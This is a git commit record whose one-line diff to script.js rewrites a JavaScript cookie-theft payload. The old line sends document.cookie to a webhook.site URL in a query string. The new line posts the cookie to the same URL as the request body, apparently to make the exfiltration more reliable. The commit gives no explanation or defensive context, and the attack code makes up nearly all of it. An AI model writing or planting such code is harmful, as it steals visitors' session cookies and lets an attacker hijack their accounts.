d36c314287dcdae46a0798be98bc7cbedd1aa1d9
Pedro Pais <pedrohpais@gmail.com>
2025-12-05 17:43:13 +0000

    Change fetch method to POST with cookie data

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/107a5ebf-c599-4709-ba56-7001c0a24077?cookie="+document.cookie)
+fetch("https://webhook.site/107a5ebf-c599-4709-ba56-7001c0a24077", {method: 'POST', body: document.cookie});
